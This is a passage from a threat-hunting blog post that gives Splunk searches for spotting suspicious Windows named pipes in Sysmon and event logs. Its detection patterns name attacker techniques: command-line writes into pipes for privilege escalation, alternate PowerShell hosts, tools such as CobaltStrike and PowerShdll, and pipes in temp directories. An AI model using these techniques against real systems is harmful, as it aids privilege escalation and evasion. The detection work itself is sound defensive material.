  metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_usage metadata_tool metadata_tool_type metadata_reference
  | where metadata_usage="detection rule"
  | stats count
    values(process_id) as process_id
    values(process_guid) as process_guid
    values(process_path) as process_path
    values(process_name) as process_name
    values(signature_id) as signature_id
    earliest(_time) as firsttime
    latest(_time) as lasttime
    by src_nt_host src_user pipe_name metadata_tool pipe_name_detection_pattern metadata_category metadata_tool_type metadata_usage metadata_comment
    metadata_description metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_reference
```

```sysmon``` is a macro searching in your sysmon logs replace it with your own macro or index/sourcetype combinaison.

Feel free to add more filters based on the severity, priority, fp\_risk, tool, category, usage or type for increased granularity.

For example, to **hunt for the usage of RMM tools**

![](https://miro.medium.com/v2/resize:fit:667/0*negbB9x_pLvleQRW.jpg)

you can add this filter `|where metadata_category="RMM"` !

If you want to hunt for lateral movement tools usage: `|where metadata_category="Lateral Movement"`

Similarly, you can filter your searches for specific needs by applying filters such as:

- Severity: `| search metadata_severity IN ("high","critical")`
- Priority: `| where metadata_priority="critical"`
- Low False Positive Risk: `| search metadata_fp_risk IN ("none","N/A","low")`
- Tool CobaltStrike: `| where metadata_tool="CobaltStrike"`
- Usage: `| where metadata_usage="detection rule"`
- Type: `| where metadata_tool_type="offensive_tool"`
- Category: `| where metadata_category="Privilege Escalation"`

…

## Hunting without the list

### Unsigned processes creating pipes

```
`sysmon` signature_id=17
NOT [|inputlookup Sysmon_exclusions.csv | fields - metadata_*]
| stats earliest(_time) as firsttime latest(_time) as lasttime
count by pipe_name process_path signature_id src_nt_host
| join process_path src_nt_host
[search `sysmon` signature_id=7 Signed=false\
| table src_nt_host process_id process_path parent_process_path Company Signed]
| search NOT [|inputlookup Unsigned_processes_creating_pipes.csv | fields - metadata_*]
```

We first search Sysmon Event ID 17 for created pipes, then pivot on the process\_path in Event ID 1 to check if the executable creating the pipe is signed. You could change the join from “process\_path src\_nt\_host” to “process\_id src\_nt\_host” (ensure these fields are correctly parsed in your Sysmon logs).

This search is reserved for threat hunting, requiring significant triage but potentially giving us interesting results. For my test:

![](https://miro.medium.com/v2/resize:fit:1777/1*3Ti9zJeP3uTPQ60WjOLz1A.png)Unsigned processes creating pipes

While writing this detection, I discovered a valuable Lateral Movement [hunting guide](https://bherunda.medium.com/hunting-detecting-smb-named-pipe-pivoting-lateral-movement-b4382bd1df4) by

[Ankith Bharadwaj](https://medium.com/u/82e590612eeb?source=post_page---user_mention--a4206e8a4bc8---------------------------------------)

that also mentions named pipes and includes other hunting searches worth reading :)

### Suspicious communication with Pipes in command lines

```
`wineventlog`
signature_id IN (1,4688)
process IN
(
"*echo * > \\\\.\\Pipe\\*",
"*copy * \\\\.\\Pipe\\*",
"*type * > \\\\.\\Pipe\\*"
)
```

This search is designed to detect potentially suspicious command line activities involving named pipes, a technique commonly used in various attack frameworks, including CobaltStrike. By focusing on specific commands (`echo`, `copy`, `type`) that interact with named pipes, aiming to identify behaviors that may indicate privilege escalation

### Pipes events from suspicious directories

This search detect potentially malicious activities by monitoring named pipe events in directories often used by attackers.

```
`sysmon`
signature_id IN (17,18)
process_path IN
(
    "*:\\Temp\\*",
    "*:\\Windows\\Temp\\*",
    "*:\\AppData\\Local\\Temp\\*",
    "*:\\ProgramData\\*",
    "*:\\Users\\Public\\*"
)
```

### Suspicious Powershell hosts

```
`sysmon`
signature_id=17
pipe_name="\\PSHost*"
NOT (Image IN (
    "*:\\Program Files\\PowerShell\\7-preview\\pwsh.exe",
    "*:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "*:\\Windows\\system32\\dsac.exe",
    "*:\\Windows\\system32\\inetsrv\\w3wp.exe",
    "*:\\Windows\\System32\\sdiagnhost.exe",
    "*:\\Windows\\system32\\ServerManager.exe",
    "*:\\Windows\\system32\\wbem\\wmiprvse.exe",
    "*:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
    "*:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "*:\\Windows\\System32\\wsmprovhost.exe",
    "*:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
    "*:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
    "*:\\Program Files\\Microsoft SQL Server\\*\\Tools\\Binn\\SQLPS.exe",
    "*:\\Program Files\\Citrix\\*",
    "*:\\Program Files\\Microsoft\\Exchange Server\\*"
))
```

There is a [sigma rule](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/pipe_created_powershell_alternate_host_pipe.yml) for everything now 🎉

This search helps identifies alternative PowerShell hosts that may evade detections (pipe not matching known legitimate processes, indicating potential misuse or anomalous activity)

Testing this with the famous tool [Powershdll](https://github.com/p3nt4/PowerShdll) and we have a match :)

![](https://miro.medium.com/v2/resize:fit:1795/1*EUAbYPqrKZu761ATwxHCag.png)

### ADFS Database Named Pipe Connection By Uncommon Tool

```
`sysmon`
signature_id IN (17,18)
pipe_name="\\MICROSOFT##WID\\tsql\\query"
NOT (
    Image IN (
        "*:\\Windows\\System32\\mmc.exe",
        "*:\\Windows\\system32\\svchost.exe",
        "*:\\Windows\\System32\\wsmprovhost.exe",
        "*:\\Windows\\SysWOW64\\mmc.exe",
        "*:\\Windows\\SysWOW64\\wsmprovhost.exe",
        "*:\\Windows\\WID\\Binn\\sqlwriter.exe",
        "*\\AzureADConnect.exe",
        "*\\Microsoft.Identity.Health.Adfs.PshSurrogate.exe",
        "*\\Microsoft.IdentityServer.ServiceHost.exe",
        "*\\Microsoft.Tri.Sensor.exe",
        "*\\sqlservr.exe",
        "*\\tssdis.exe"
    )
)
```

From a [sigma rule](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/pipe_created_adfs_namedpipe_connection_uncommon_tool.yml) by [@Cyb3rWard0g](http://twitter.com/Cyb3rWard0g) that detects suspicious local connections to the AD FS configuration database !

### Uncommon Named Pipes Detection

Incorporating the usual behavior of certain processes can help us identify anomalies when those processes use unexpected named pipes. For instance, if `powershell.exe` creates a named pipe other than an anonymous pipe or the `\PSHost*` pipe, it might be suspicious and worth investigating. This approach is primarily for threat hunting and large-scale triage, provided you have sufficient telemetry. It will likely generate a substantial volume of results to review.

**Initial Search: Collect Named Pipe Relationships in Your Environment**

Run the following search once every three months to gather named pipe relationships. Note that this search may take some time to complete:

```
`sysmon` signature_id IN (17,18) earliest=-90d latest=now
[| inputlookup named_pipes_list.csv |  fields - metadata_*]
NOT [| inputlookup named_pipes_exclusions.csv |fields - metadata_*]
| fields pipe_name process_path signature_id
| dedup pipe_name process_path signature_id
| collect index=known_named_pipes_relation sourcetype=stash
```

`named_pipes_list.csv` _contains a list of named pipes or process paths we want to monitor and_`named_pipes_execlusions.csv` _contains default exclusions for name pipes pattern as some will contain random strings after a static pattern, several default exclusions are necessary, search without the lookups first to have an idea of which named pipes are used in your environment and which ones will need an exclusion_

**Second Search: Identify Unknown Named Pipes Patterns by Known Processes**

```
`sysmon` signature_id IN (17,18)
NOT [| inputlookup named_pipes_exclusions.csv |fields - metadata_*]
| search
NOT [| search index=known_named_pipes_relation sourcetype=stash\
       earliest=-90d latest=now\
       |fields pipe_name process_path signature_id]
| stats count
earliest(_time) as firsttime
latest(_time) as lasttime
by src_nt_host src_user pipe_name process_path signature_id index sourcetype
| sort - count
```

**Uncommon Named pipes Execution via IPC$ with EID 5145**

Seeing **_IPC$_** in the share path of a Microsoft Event ID [**5145**](https://github.com/mthcht/awesome-lists/blob/main/Lists/wineventlogs/EventIDs/Security-5145.md) typically indicates an attempt to access the inter-process communication share on a Windows machine. While this activity is often legitimate, it could also indicate a lateral movement within the network.

The **relativeTargetName** field will contain the specific named pipe used. Similar to the two searches mentioned above, you can gather and analyze the named pipe relationships in your environment by monitoring the **IPC$** share path used with the EventID [**5145**](https://github.com/mthcht/awesome-lists/blob/main/Lists/wineventlogs/EventIDs/Security-5145.md). This allows you to detect and flag any uncommon or suspicious named pipes associated with the IPC$ share.

### Suspicious process running as SYSTEM connecting to Named Pipes

```
`sysmon`
signature_id=18
src_user_id="S-1–5–18"
process_name IN (powershell.exe, powershell_ise.exe, cmd.exe, wmiprvse.exe, spoolsv.exe, rundll32.exe, wscript.exe, cscript.exe, mshta.exe)
```

It could help detect some Named Pipe exploitations, it’s better to use the user SID instead of the username, as usernames can vary with system language settings.

Besides these specific searches with named pipe, I don’t have additional hunting searches to recommend at this time. Establishing a baseline and detecting anomalies with these logs is challenging, and you may not have sufficient telemetry (depending on your environment). Collecting such data on a large scale with Sysmon without filters can result in overwhelming volumes of data. Instead, I prefer focusing on known malicious and suspicious named pipes using [my list](https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_named_pipe_list.csv) and some other known named pipe associated with various protocols (SMB, RPC, SQL…). You can adapt your Sysmon configuration to include all the pipe names in my list if you want to really control the verbosity.

```
    <PipeEvent onmatch="include">
      <PipeName condition="is">...
```

I hope you’ll find [the list](https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_named_pipe_list.csv) and the hunting searches valuable. Your feedback is always welcome!

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*teLBKmWvGQDxYdAdpdn28g.png)

Happy Hunting !

[Threat Hunting](https://medium.com/tag/threat-hunting?source=post_page-----a4206e8a4bc8---------------------------------------)

[Threat Intelligence](https://medium.com/tag/threat-intelligence?source=post_page-----a4206e8a4bc8---------------------------------------)

[Named Pipes](https://medium.com/tag/named-pipes?source=post_page-----a4206e8a4bc8---------------------------------------)

[Dfir](https://medium.com/tag/dfir?source=post_page-----a4206e8a4bc8---------------------------------------)

[Splunk](https://medium.com/tag/splunk?source=post_page-----a4206e8a4bc8---------------------------------------)

[![Detect FYI](https://miro.medium.com/v2/resize:fill:48:48/1*ayMhoNccbO0IxQ1UPFv0SA.png)](https://detect.fyi/?source=post_page---post_publication_info--a4206e8a4bc8---------------------------------------)

[![Detect FYI](https://miro.medium.com/v2/resize:fill:64:64/1*ayMhoNccbO0IxQ1UPFv0SA.png)](https://detect.fyi/?source=post_page---post_publication_info--a4206e8a4bc8---------------------------------------)

Follow

[**Published in Detect FYI**](https://detect.fyi/?source=post_page---post_publication_info--a4206e8a4bc8---------------------------------------)

[2.5K followers](https://detect.fyi/followers?source=post_page---post_publication_info--a4206e8a4bc8---------------------------------------)

· [Last published 1 day ago](https://detect.fyi/detection-satelital-dll-sideloading-via-mfc-turla-s-kazuar-v3-3de2fbd2d6af?source=post_page---post_publication_info--a4206e8a4bc8---------------------------------------)

Threat Detection Engineering and DFIR Insights

Follow

[![mthcht](https://miro.medium.com/v2/resize:fill:48:48/1*h7dUyUQgUIrGSCgdizGKYw.png)](https://mthcht.medium.com/?source=post_page---post_author_info--a4206e8a4bc8---------------------------------------)

[![mthcht](https://miro.medium.com/v2/resize:fill:64:64/1*h7dUyUQgUIrGSCgdizGKYw.png)](https://mthcht.medium.com/?source=post_page---post_author_info--a4206e8a4bc8---------------------------------------)

Follow

[**Written by mthcht**](https://mthcht.medium.com/?source=post_page---post_author_info--a4206e8a4bc8---------------------------------------)

[848 followers](https://mthcht.medium.com/followers?source=post_page---post_author_info--a4206e8a4bc8---------------------------------------)

· [64 following](https://medium.com/@mthcht/following?source=post_page---post_author_info--a4206e8a4bc8---------------------------------------)

Threat Hunting - DFIR - Detection Engineering

Follow

## No responses yet

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fdetect.fyi%2Fthreat-hunting-suspicious-named-pipes-a4206e8a4bc8&source=---post_responses--a4206e8a4bc8---------------------respond_sidebar------------------)

Cancel

Respond

## More from mthcht and Detect FYI

[![Detect FYI](https://miro.medium.com/v2/resize:fill:20:20/1*ayMhoNccbO0IxQ1UPFv0SA.png)](https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----0---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

In

[Detect FYI](https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----0---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

by

[mthcht](https://mthcht.medium.com/?source=post_page---author_recirc--a4206e8a4bc8----0---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

[**Threat Hunting - Suspicious User Agents**\\
\\
**Hunting for Suspicious User Agents with Splunk**](https://detect.fyi/threat-hunting-suspicious-user-agents-3dd764470bd0?source=post_page---author_recirc--a4206e8a4bc8----0---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

Jan 1, 2024

[A clap icon262\\
\\
A response icon3](https://detect.fyi/threat-hunting-suspicious-user-agents-3dd764470bd0?source=post_page---author_recirc--a4206e8a4bc8----0---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

[![Detect FYI](https://miro.medium.com/v2/resize:fill:20:20/1*ayMhoNccbO0IxQ1UPFv0SA.png)](https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----1---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

In

[Detect FYI](https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----1---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

by

[Alex Teixeira](https://ateixei.medium.com/?source=post_page---author_recirc--a4206e8a4bc8----1---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

[**Introducing > PowerShell.Exposed**\\
\\
**Community-driven pattern-based detection indicators**](https://detect.fyi/introducing-powershell-exposed-4974fe712117?source=post_page---author_recirc--a4206e8a4bc8----1---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

Jan 20

[A clap icon21\\
\\
A response icon2](https://detect.fyi/introducing-powershell-exposed-4974fe712117?source=post_page---author_recirc--a4206e8a4bc8----1---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

[![Detect FYI](https://miro.medium.com/v2/resize:fill:20:20/1*ayMhoNccbO0IxQ1UPFv0SA.png)](https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----2---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

In

[Detect FYI](https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----2---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

by

[dfirloading](https://medium.com/@dfirloading?source=post_page---author_recirc--a4206e8a4bc8----2---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

[**Detection of Kerberos Golden Ticket Attacks via Velociraptor**\\
\\
**Kerberos is a strange technology. Over the years, I’ve gone through its internal workings again and again, yet parts of it always seem to…**](https://detect.fyi/detection-of-kerberos-golden-ticket-attacks-via-velociraptor-cfe7cc26d3eb?source=post_page---author_recirc--a4206e8a4bc8----2---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

Jan 11

[A clap icon2](https://detect.fyi/detection-of-kerberos-golden-ticket-attacks-via-velociraptor-cfe7cc26d3eb?source=post_page---author_recirc--a4206e8a4bc8----2---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

[![Detect FYI](https://miro.medium.com/v2/resize:fill:20:20/1*ayMhoNccbO0IxQ1UPFv0SA.png)](https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----3---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

In

[Detect FYI](https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----3---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

by

[mthcht](https://mthcht.medium.com/?source=post_page---author_recirc--a4206e8a4bc8----3---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

[**Detecting DNS over HTTPS**\\
\\
**Detecting DNS over HTTPS - DoH with a SIEM - logs analysis**](https://detect.fyi/detecting-dns-over-https-30fddb55ac78?source=post_page---author_recirc--a4206e8a4bc8----3---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

Nov 7, 2023

[A clap icon146\\
\\
A response icon2](https://detect.fyi/detecting-dns-over-https-30fddb55ac78?source=post_page---author_recirc--a4206e8a4bc8----3---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------)

[See all from mthcht](https://mthcht.medium.com/?source=post_page---author_recirc--a4206e8a4bc8---------------------------------------)

[See all from Detect FYI](https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8---------------------------------------)

## Recommended from Medium

[![Hartarto](https://miro.medium.com/v2/resize:fill:20:20/1*6oQdch9vjyYS58bBmtyaZQ.jpeg)](https://hartarto.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[Hartarto](https://hartarto.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[**15 Free OSINT Tools That Reveal Everything Online (2026 Guide)**\\
\\
**Everything about you online leaves a trail. Emails, websites, servers, and devices continuously expose information — not because you were…**](https://hartarto.medium.com/15-free-osint-tools-that-reveal-everything-online-2026-guide-8d74162d70ec?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

Jan 7

[A clap icon905\\
\\
A response icon11](https://hartarto.medium.com/15-free-osint-tools-that-reveal-everything-online-2026-guide-8d74162d70ec?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[![CapturedSignal](https://miro.medium.com/v2/resize:fill:20:20/1*6BhwCO8OOhRJKPgYe28jBg.png)](https://medium.com/capturedsignal?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

In

[CapturedSignal](https://medium.com/capturedsignal?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

by

[Bartosz Turek](https://medium.com/@turekbar?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[**Notepad++ Security Incident — Threat Hunting using KQL and Defender for Endpoint logs**\\
\\
**First of all, bad news, I don’t think you have 8 months of hot retention logs in your Sentinel. The incident took place from June 2025 to…**](https://medium.com/capturedsignal/notepad-security-incident-threat-hunting-using-kql-and-defender-for-endpoint-logs-dd83b984fcc6?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

Feb 2

[A clap icon26](https://medium.com/capturedsignal/notepad-security-incident-threat-hunting-using-kql-and-defender-for-endpoint-logs-dd83b984fcc6?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[![Very Lazy Tech 👾](https://miro.medium.com/v2/resize:fill:20:20/1*cQVMEaLp7npt5Gw9hUV7aQ.png)](https://medium.verylazytech.com/?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[Very Lazy Tech 👾](https://medium.verylazytech.com/?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[**13 Techniques to Stay Undetected in Corporate Networks: Master Stealthy Pentesting Like a Pro**\\
\\
**Why Stealth Matters in Modern Pentesting**](https://medium.verylazytech.com/13-techniques-to-stay-undetected-in-corporate-networks-master-stealthy-pentesting-like-a-pro-4a70120a9062?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

Feb 1

[A clap icon109](https://medium.verylazytech.com/13-techniques-to-stay-undetected-in-corporate-networks-master-stealthy-pentesting-like-a-pro-4a70120a9062?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[![Syed Jawad](https://miro.medium.com/v2/resize:fill:20:20/1*h6aMT8eBVJU1VIKYXW1Ncw.png)](https://medium.com/@syedjawad07?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[Syed Jawad](https://medium.com/@syedjawad07?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[**Detecting Malware in Real-Time: Integrating Wazuh FIM with YARA**\\
\\
**How I Built an Automated Malware Detection System Using Open-Source Tools (Wazuh)**](https://medium.com/@syedjawad07/detecting-malware-in-real-time-integrating-wazuh-fim-with-yara-d397edcd3b9a?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

Dec 22, 2025

[A clap icon5\\
\\
A response icon1](https://medium.com/@syedjawad07/detecting-malware-in-real-time-integrating-wazuh-fim-with-yara-d397edcd3b9a?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[![Allen Ace](https://miro.medium.com/v2/resize:fill:20:20/1*d314xgZRLVtWSIpQXdOhbQ.jpeg)](https://allenace.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----2---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[Allen Ace](https://allenace.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----2---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[**Introduction to Honeypot Data Analysis**\\
\\
**In the earlier article, we set up a honeypot in the cloud to gather data from actual cyberattacks. Now the obvious question arises: how…**](https://allenace.medium.com/introduction-to-honeypot-data-analysis-f25aa5d998de?source=post_page---read_next_recirc--a4206e8a4bc8----2---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

Jan 27

[A clap icon317](https://allenace.medium.com/introduction-to-honeypot-data-analysis-f25aa5d998de?source=post_page---read_next_recirc--a4206e8a4bc8----2---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[![Asad Syed](https://miro.medium.com/v2/resize:fill:20:20/1*XIoeHEMahH1YMAH1S1VuuA.jpeg)](https://asadsyedchi.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----3---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[Asad Syed](https://asadsyedchi.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----3---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[**Threat Hunting Methodologies**\\
\\
**An overview of SOC threat hunting methodologies that use comprehensive hypothesis-driven hunts to raise your organization’s maturity level.**](https://asadsyedchi.medium.com/threat-hunting-methodologies-79956229392a?source=post_page---read_next_recirc--a4206e8a4bc8----3---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

Nov 4, 2025

[A clap icon5\\
\\
A response icon1](https://asadsyedchi.medium.com/threat-hunting-methodologies-79956229392a?source=post_page---read_next_recirc--a4206e8a4bc8----3---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------)

[See more recommendations](https://medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8---------------------------------------)

[Help](https://help.medium.com/hc/en-us?source=post_page-----a4206e8a4bc8---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----a4206e8a4bc8---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----a4206e8a4bc8---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----a4206e8a4bc8---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----a4206e8a4bc8---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----a4206e8a4bc8---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----a4206e8a4bc8---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----a4206e8a4bc8---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----a4206e8a4bc8---------------------------------------)